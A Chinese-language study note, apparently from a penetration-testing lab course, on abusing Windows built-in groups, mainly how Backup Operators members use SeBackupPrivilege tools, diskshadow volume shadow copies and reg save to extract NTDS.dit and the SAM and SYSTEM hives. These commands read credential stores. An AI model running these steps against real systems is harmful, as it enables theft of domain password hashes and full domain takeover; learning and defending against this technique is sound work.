# windows组权限

# windows内置组

Windows的内置组：
- Backup Operators 备份操作员	
- Event Log Readers 事件日志读取器	
- DnsAdminsDNS 管理员
- Hyper-V AdministratorsHyper-V 管理员
- Print Operators 打印操作员	
- Server Operators 服务器运营商

## Backup Operators备份操作员

显示当前用户的权限状态：
```powershell
whoami /priv
```
Backup Operators的组成员有`SeBackup`和`SeRestore`的权限。
SeBackupPrivilege 允许我们遍历任何文件夹并列出文件夹内容。这将允许我们从文件夹复制文件，即使文件夹的访问控制列表 (ACL) 中没有我们的访问控制条目 (ACE)。但是，我们无法使用标准复制命令来执行此操作。相反，我们需要以编程方式复制数据，确保指定 FILE_FLAG_BACKUP_SEMANTICS 标志。

利用该权限的工具地址`https://github.com/giuliano108/SeBackupPrivilege`

### 权限的一般使用方法

**导入**
Importing Libraries导入库:
```
PS C:\htb> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\htb> Import-Module .\SeBackupPrivilegeCmdLets.dll
```

查看该权限的状态：`Get-SeBackupPrivilege`
使用`Set-SeBackupPrivilege`启用该权限
```
PS C:\htb> Set-SeBackupPrivilege
PS C:\htb> Get-SeBackupPrivilege
```
**复制文件**
可以复制高于自己权限的文件，而被复制后的文件我们有读的权限。
复制示例：
```
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
```
### 其他使用方法

**攻击域控制器 - 复制 NTDS.dit**
此组还允许在本地登录到域控制器。Active Directory 数据库 NTDS.dit 是一个非常有吸引力的目标，因为它包含域中所有用户和计算机对象的 NTLM 哈希。但是，此文件已锁定，非特权用户也无法访问。

由于 NTDS.dit 文件默认处于锁定状态，因此我们可以使用 Windows diskshadow 实用程序创建 C 盘的卷影副本，并将其公开为 E 盘。此卷影副本中的 NTDS.dit 不会被系统使用。
diskshadow介绍：`https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow` (好像只有windows的服务器才可以使用，个人PC不行)

大致操作：
```
PS C:\htb> diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

PS C:\htb> dir E:


    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
现在已经把文件复制到E盘了，可以使用SeBackUpPrivilege权限把文件复制到其他目录下:
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
(这个操作成功的前提是操作的PC有E盘，或是有别的盘符。)
```

**备份 SAM 和 SYSTEM 注册表配置单元**

备份：
```
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
The operation completed successfully.


C:\htb> reg save HKLM\SAM SAM.SAV
The operation completed successfully.
```
值得注意的是，如果文件夹或文件对我们的当前用户或他们所属的组有明确的拒绝条目，这将阻止我们访问它，即使指定了 FILE_FLAG_BACKUP_SEMANTICS 标志。

**其他内容**

详见HTBA-WINDOWS 权限提升-Windows 内置组：
- 从 NTDS.dit 中提取凭据
- 使用 SecretsDump 提取哈希
- 使用 Robocopy 复制文件


## Event Log Readers事件日志读取器

